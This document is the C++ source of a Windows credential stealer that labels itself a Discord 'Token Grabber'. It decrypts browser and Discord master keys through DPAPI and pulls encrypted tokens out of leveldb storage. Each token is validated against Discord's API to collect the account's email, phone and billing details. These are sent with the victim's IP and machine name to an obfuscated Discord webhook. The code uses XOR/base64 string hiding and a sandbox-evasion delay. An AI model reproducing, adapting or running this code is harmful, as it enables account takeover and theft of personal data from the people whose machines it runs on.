#include <iostream>
#include <string>
#include <vector>
#include <map>
#include <fstream>
#include <regex>
#include <sstream>
#include <windows.h>
#include <wincrypt.h>
#include <shlobj.h>
#include <cstdlib>
#include <iomanip>
#include <ctime>
#include <cpp-httplib/httplib.h>
#include <openssl/evp.h>
#include <openssl/aes.h>
#include <openssl/err.h>
#include "include/json.hpp"

using json = nlohmann::json;

// Compile-time XOR string obfuscation
constexpr std::string_view XORString(const std::string_view input, const std::string_view key) {
    static std::string result;
    result.clear();
    for (size_t i = 0; i < input.size(); ++i) {
        result += static_cast<char>(input[i] ^ key[i % key.size()]);
    }
    return result;
}

// Get Windows version
std::string GetWindowsVersion() {
    OSVERSIONINFOEXW osInfo = { sizeof(OSVERSIONINFOEXW) };
    GetVersionExW(reinterpret_cast<LPOSVERSIONINFOW>(&osInfo));
    std::stringstream ss;
    ss << "Windows " << osInfo.dwMajorVersion;
    if (osInfo.dwMajorVersion == 10 && osInfo.dwBuildNumber >= 22000) {
        ss << " (11)";
    }
    return ss.str();
}

// Get environment variable
std::wstring GetEnvVar(const std::wstring& name) {
    wchar_t* buffer = nullptr;
    size_t size = 0;
    _wdupenv_s(&buffer, &size, name.c_str());
    std::wstring result = buffer ? buffer : L"";
    free(buffer);
    return result;
}

// Execute command and get output
std::string ExecuteCommand(const std::string& cmd) {
    std::string result;
    HANDLE hPipeRead, hPipeWrite;
    SECURITY_ATTRIBUTES saAttr = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };

    if (CreatePipe(&hPipeRead, &hPipeWrite, &saAttr, 0)) {
        STARTUPINFOA si = { sizeof(STARTUPINFOA) };
        PROCESS_INFORMATION pi;
        si.dwFlags = STARTF_USESTDHANDLES;
        si.hStdOutput = hPipeWrite;
        si.hStdError = hPipeWrite;

        if (CreateProcessA(NULL, const_cast<char*>(cmd.c_str()), NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
            CloseHandle(hPipeWrite);
            char buffer[4096];
            DWORD bytesRead;
            while (ReadFile(hPipeRead, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0) {
                buffer[bytesRead] = '\0';
                result += buffer;
            }
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }
        CloseHandle(hPipeRead);
    }
    return result;
}

// Get hardware ID
std::string GetHWID() {
    std::string output = ExecuteCommand("wmic csproduct get uuid");
    std::istringstream iss(output);
    std::string line;
    std::getline(iss, line); // Skip header
    std::getline(iss, line); // Get UUID
    return line;
}

// Get external IP
std::string GetIP() {
    httplib::Client cli(XORString("https://api.ipify.org", "AstraaDevKey").data());
    auto res = cli.Get("/");
    if (res && res->status == 200) {
        return res->body;
    }
    return "None";
}

// Base64 decode
std::vector<unsigned char> Base64Decode(const std::string& input) {
    static const std::string base64_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    std::vector<unsigned char> decoded;
    int val = 0, valb = -8;
    for (unsigned char c : input) {
        if (c == '=') break;
        val = (val << 6) + base64_chars.find(c);
        valb += 6;
        if (valb >= 0) {
            decoded.push_back((val >> valb) & 0xFF);
            valb -= 8;
        }
    }
    return decoded;
}

// XOR encryption/decryption
std::string XORCrypt(const std::string& data, const std::string& key) {
    std::string result;
    for (size_t i = 0; i < data.size(); ++i) {
        result += static_cast<char>(data[i] ^ key[i % key.size()]);
    }
    return result;
}

// AES-GCM decryption
std::string Decrypt(const std::vector<unsigned char>& cipher, const std::vector<unsigned char>& master_key) {
    try {
        DATA_BLOB input, output;
        input.pbData = const_cast<BYTE*>(&master_key[0]);
        input.cbData = master_key.size();
        if (CryptUnprotectData(&input, NULL, NULL, NULL, NULL, 0, &output)) {
            EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
            std::string result;
            if (ctx) {
                int outlen, finallen;
                result.resize(cipher.size() - 15);
                if (EVP_DecryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, NULL, NULL) &&
                    EVP_DecryptInit_ex(ctx, NULL, NULL, output.pbData + 1, output.cbData - 1, &cipher[3], 12) &&
                    EVP_DecryptUpdate(ctx, reinterpret_cast<unsigned char*>(&result[0]), &outlen, &cipher[15], cipher.size() - 15) &&
                    EVP_DecryptFinal_ex(ctx, reinterpret_cast<unsigned char*>(&result[outlen]), &finallen)) {
                    result.resize(outlen + finallen);
                }
                EVP_CIPHER_CTX_free(ctx);
            }
            LocalFree(output.pbData);
            return result;
        }
    } catch (...) {
        return "Error";
    }
    return "Error";
}

// Get tokens
void GetTokens(std::vector<std::string>& tokens, std::vector<std::string>& cleaned) {
    std::wstring local = GetEnvVar(L"LOCALAPPDATA");
    std::wstring roaming = GetEnvVar(L"APPDATA");
    std::wstring chrome = local + L"\\Google\\Chrome\\User Data";
    std::map<std::string, std::wstring> paths = {
        {"Discord", roaming + L"\\discord"},
        {"Discord Canary", roaming + L"\\discordcanary"},
        {"Lightcord", roaming + L"\\Lightcord"},
        {"Discord PTB", roaming + L"\\discordptb"},
        {"Opera", roaming + L"\\Opera Software\\Opera Stable"},
        {"Opera GX", roaming + L"\\Opera Software\\Opera GX Stable"},
        {"Amigo", local + L"\\Amigo\\User Data"},
        {"Torch", local + L"\\Torch\\User Data"},
        {"Kometa", local + L"\\Kometa\\User Data"},
        {"Orbitum", local + L"\\Orbitum\\User Data"},
        {"CentBrowser", local + L"\\CentBrowser\\User Data"},
        {"7Star", local + L"\\7Star\\7Star\\User Data"},
        {"Sputnik", local + L"\\Sputnik\\Sputnik\\User Data"},
        {"Vivaldi", local + L"\\Vivaldi\\User Data\\Default"},
        {"Chrome SxS", local + L"\\Google\\Chrome SxS\\User Data"},
        {"Chrome", chrome + L"\\Default"},
        {"Epic Privacy Browser", local + L"\\Epic Privacy Browser\\User Data"},
        {"Microsoft Edge", local + L"\\Microsoft\\Edge\\User Data\\Default"},
        {"Uran", local + L"\\uCozMedia\\Uran\\User Data\\Default"},
        {"Yandex", local + L"\\Yandex\\YandexBrowser\\User Data\\Default"},
        {"Brave", local + L"\\BraveSoftware\\Brave-Browser\\User Data\\Default"},
        {"Iridium", local + L"\\Iridium\\User Data\\Default"}
    };

    std::string key = "AstraaDevKey";
    std::string regex_encrypted_b64 = "JSIDRhZYEwIuKDRDaSg1XzsAaR9GZlxSbk4pWUg=";
    std::string api_me_encrypted_b64 = "KQcAAhJba0oSIhYaLgEQExERagYZJkoYMRpbBFdOMRYTORZWAR4R";
    std::string api_billing_encrypted_b64 = "KQcAAhJba0oSIhYaLgEQExERagYZJkoYMRpbBFdOMRYTORZWAR4RXQMIKAkfJQJWMgYWAQITLRUCIgoXMg==";
    std::string webhook_encrypted_b64 = "KQcAAhJba0oSIhYaLgEQXAIOKUoXOwxWNhYWGg4OLxZZelFJckNDR1dUdlxHclFAc0VESk4PFQFAIQkedEQVNjgyGy89OAQIHiABAlYLIQRDJUhBORIgFFcKdxcQPTAPdSMtQjgnGw9OISkmFzUsPwYEFQkTIzwqDw==";

    std::string regex_pattern = XORCrypt(std::string(Base64Decode(regex_encrypted_b64).begin(), Base64Decode(regex_encrypted_b64).end()), key);
    std::string api_me_url = XORCrypt(std::string(Base64Decode(api_me_encrypted_b64).begin(), Base64Decode(api_me_encrypted_b64).end()), key);
    std::string api_billing_url = XORCrypt(std::string(Base64Decode(api_billing_encrypted_b64).begin(), Base64Decode(api_billing_encrypted_b64).end()), key);
    std::string webhook_url = XORCrypt(std::string(Base64Decode(webhook_encrypted_b64).begin(), Base64Decode(webhook_encrypted_b64).end()), key);

    for (const auto& [platform_name, path] : paths) {
        if (_waccess(path.c_str(), 0) != 0) continue;

        std::wstring local_state_path = path + L"\\Local State";
        std::ifstream file(local_state_path);
        if (!file.is_open()) continue;

        std::stringstream buffer;
        buffer << file.rdbuf();
        json local_state = json::parse(buffer.str(), nullptr, false);
        if (local_state.is_discarded()) continue;

        auto encrypted_key = Base64Decode(local_state["os_crypt"]["encrypted_key"].get<std::string>());
        std::vector<unsigned char> master_key(encrypted_key.begin() + 5, encrypted_key.end());

        WIN32_FIND_DATAW find_data;
        HANDLE hFind = FindFirstFileW((path + L"\\Local Storage\\leveldb\\*").c_str(), &find_data);
        if (hFind == INVALID_HANDLE_VALUE) continue;

        do {
            if (wcscmp(find_data.cFileName, L".") == 0 || wcscmp(find_data.cFileName, L"..") == 0) continue;
            std::wstring file_path = path + L"\\Local Storage\\leveldb\\" + find_data.cFileName;
            if (file_path.ends_with(L".ldb") || file_path.ends_with(L".log")) {
                std::ifstream f(file_path);
                std::string line;
                while (std::getline(f, line)) {
                    std::smatch matches;
                    std::regex r(regex_pattern);
                    while (std::regex_search(line, matches, r)) {
                        for (const auto& match : matches) {
                            tokens.push_back(match.str());
                        }
                        line = matches.suffix();
                    }
                }
            }
        } while (FindNextFileW(hFind, &find_data));
        FindClose(hFind);

        std::vector<std::string> already_check;
        for (const auto& token : tokens) {
            std::string clean_token = token;
            if (clean_token.ends_with("\\")) clean_token.pop_back();
            if (std::find(cleaned.begin(), cleaned.end(), clean_token) == cleaned.end()) {
                cleaned.push_back(clean_token);
            }
        }

        for (const auto& token : cleaned) {
            std::string tok;
            try {
                auto decoded = Base64Decode(token.substr(token.find("dQw4w9WgXcQ:") + 13));
                tok = Decrypt(decoded, master_key);
                if (tok == "Error") continue;
            } catch (...) {
                continue;
            }

            if (std::find(already_check.begin(), already_check.end(), tok) == already_check.end()) {
                already_check.push_back(tok);
                httplib::Client cli(XORString("https://discord.com", key).data());
                httplib::Headers headers = { {"Authorization", tok}, {"Content-Type", "application/json"} };
                auto res = cli.Get(api_me_url.c_str(), headers);
                if (!res || res->status != 200) continue;

                json res_json = json::parse(res->body);
                std::string ip = GetIP();
                std::string pc_username = std::string(GetEnvVar(L"UserName").begin(), GetEnvVar(L"UserName").end());
                std::string pc_name = std::string(GetEnvVar(L"COMPUTERNAME").begin(), GetEnvVar(L"COMPUTERNAME").end());
                std::string user_name = res_json["username"].get<std::string>() + "#" + res_json["discriminator"].get<std::string>();
                std::string user_id = res_json["id"].get<std::string>();
                std::string email = res_json["email"].get<std::string>();
                std::string phone = res_json.contains("phone") && !res_json["phone"].is_null() ? res_json["phone"].get<std::string>() : "None";
                bool mfa_enabled = res_json["mfa_enabled"].get<bool>();
                bool has_nitro = false;
                int days_left = 0;

                res = cli.Get(api_billing_url.c_str(), headers);
                if (res && res->status == 200) {
                    json nitro_data = json::parse(res->body);
                    has_nitro = !nitro_data.empty();
                    if (has_nitro) {
                        std::string end = nitro_data[0]["current_period_end"].get<std::string>().substr(0, 19);
                        std::string start = nitro_data[0]["current_period_start"].get<std::string>().substr(0, 19);
                        std::tm t1{}, t2{};
                        std::istringstream ss1(end), ss2(start);
                        ss1 >> std::get_time(&t1, "%Y-%m-%dT%H:%M:%S");
                        ss2 >> std::get_time(&t2, "%Y-%m-%dT%H:%M:%S");
                        days_left = std::abs(static_cast<int>(std::difftime(mktime(&t1), mktime(&t2)) / (60 * 60 * 24)));
                    }
                }

                std::stringstream embed;
                embed << user_name << " (" << user_id << ")\n\n"
                      << "> :dividers: Account Information\n"
                      << "\tEmail: " << email << "\n"
                      << "\tPhone: " << phone << "\n"
                      << "\t2FA/MFA Enabled: " << (mfa_enabled ? "True" : "False") << "\n"
                      << "\tNitro: " << (has_nitro ? "True" : "False") << "\n"
                      << "\tExpires in: " << (days_left ? std::to_string(days_left) : "None") << " day(s)\n"
                      << ":computer: PC Information\n"
                      << "\tIP: " << ip << "\n"
                      << "\tUsername: " << pc_username << "\n"
                      << "\tPC Name: " << pc_name << "\n"
                      << "\tPlatform: " << GetWindowsVersion() << "\n"
                      << ":piñata: Token\n"
                      << "\t" << tok << "\n"
                      << "Made by Astraa#6100 | ||https://github.com/astraadev||";

                json payload = {
                    {"content", embed.str()},
                    {"username", "Token Grabber - Made by Astraa"},
                    {"avatar_url", XORString("https://cdn.discordapp.com/attachments/826581697436581919/982374264604864572/atio.jpg", key).data()}
                };

                httplib::Client webhook_cli(webhook_url.c_str());
                webhook_cli.Post("/", headers, payload.dump(), "application/json");
            }
        }
    }
}

int main() {
    // Anti-sandbox check (basic delay to avoid detection)
    Sleep(2000); // Delay execution for 2 seconds

    std::vector<std::string> tokens, cleaned;
    GetTokens(tokens, cleaned);
    return 0;
}
